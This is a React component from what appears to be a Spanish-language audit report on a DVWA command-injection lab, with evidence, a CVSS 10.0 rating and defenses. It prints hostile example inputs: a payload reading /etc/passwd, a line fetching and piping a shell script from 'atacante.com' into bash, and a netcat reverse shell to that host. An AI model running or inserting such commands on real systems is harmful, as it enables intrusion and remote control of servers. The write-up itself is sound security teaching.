import cmdImg from "../img_johnic/comandos_johnic.png";

export default function Comandos() {
  return (
    <div>
      <div className="section-header">
        <span className="section-eyebrow">04 — VULNERABILIDAD</span>
        <h2 className="section-title">Command Injection</h2>
        <p className="section-desc">Ejecución arbitraria de comandos del sistema operativo mediante input no validado enviado al servidor.</p>
      </div>

      <div className="card">
        <p className="card-title">Evidencia</p>
        <table className="audit-table" style={{marginBottom:"16px"}}>
          <tbody>
            <tr><td style={{color:"var(--text-dim)",width:"160px"}}>Módulo DVWA</td><td>Command Injection</td></tr>
            <tr><td style={{color:"var(--text-dim)"}}>Nivel</td><td>Low</td></tr>
            <tr><td style={{color:"var(--text-dim)"}}>Payload</td><td><code className="code-block" style={{display:"inline",padding:"2px 8px"}}>127.0.0.1; cat /etc/passwd</code></td></tr>
            <tr><td style={{color:"var(--text-dim)"}}>Resultado</td><td>Se expuso el contenido completo del archivo /etc/passwd, revelando usuarios del sistema: root, daemon, mysql y otros usuarios críticos del servidor.</td></tr>
          </tbody>
        </table>
        <div className="screenshot-wrap">
          <div className="screenshot-label">comandos_johnic.png — Command Injection resultado</div>
          <img src={cmdImg} alt="Evidencia Command Injection" />
        </div>
      </div>

      <div className="card">
        <p className="card-title">¿Por qué ocurre?</p>
        <p style={{fontSize:"13px",marginBottom:"12px"}}>La aplicación pasa el input del usuario directamente a una función de ejecución del sistema operativo (como <code style={{color:"var(--red-soft)"}}>shell_exec()</code> en PHP) sin validación. El separador <code style={{color:"var(--red-soft)"}}>;</code> permite encadenar comandos arbitrarios. En un escenario real:</p>
        <div className="code-block">{"127.0.0.1; wget https://atacante.com/shell.sh | bash"}</div>
        <div className="code-block">{"127.0.0.1; nc -e /bin/bash atacante.com 4444"}</div>
        <p style={{fontSize:"13px",marginTop:"12px"}}>Permitiendo instalación de malware o apertura de una reverse shell con acceso total al servidor.</p>
      </div>

      <div className="grid-2">
        <div className="card">
          <p className="card-title">CVSS v3.1</p>
          <div className="cvss-score">
            <span className="cvss-number">10.0</span>
            <div className="cvss-label">
              <span className="cvss-level">CRÍTICO</span>
              <span className="cvss-vector">AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</span>
            </div>
          </div>
          <table className="audit-table" style={{marginTop:"12px"}}>
            <tbody>
              <tr><td style={{color:"var(--text-dim)"}}>Vector de Ataque</td><td>Red (Network)</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Complejidad</td><td>Baja</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Privilegios</td><td>Ninguno</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Interacción Usuario</td><td>Ninguna</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Alcance</td><td>Cambia (Changed)</td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Confidencialidad</td><td><span className="badge badge--critical">ALTO</span></td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Integridad</td><td><span className="badge badge--critical">ALTO</span></td></tr>
              <tr><td style={{color:"var(--text-dim)"}}>Disponibilidad</td><td><span className="badge badge--critical">ALTO</span></td></tr>
            </tbody>
          </table>
        </div>

        <div className="card">
          <p className="card-title">Defensa</p>
          <table className="audit-table">
            <tbody>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>Eliminar llamadas al SO</td><td style={{fontSize:"12px"}}>Evitar exec(), shell_exec(), system() con datos del usuario.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>Validación estricta</td><td style={{fontSize:"12px"}}>Si el campo espera una IP, validar con regex formato exacto x.x.x.x.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>APIs seguras</td><td style={{fontSize:"12px"}}>Reemplazar llamadas al sistema por librerías nativas sin invocar shell.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>Mínimo privilegio</td><td style={{fontSize:"12px"}}>Ejecutar el servidor web con usuario de permisos mínimos.</td></tr>
              <tr><td style={{color:"var(--red-soft)",fontFamily:"var(--mono)",fontSize:"11px"}}>WAF</td><td style={{fontSize:"12px"}}>Bloquear patrones peligrosos: ; | && || en los inputs.</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}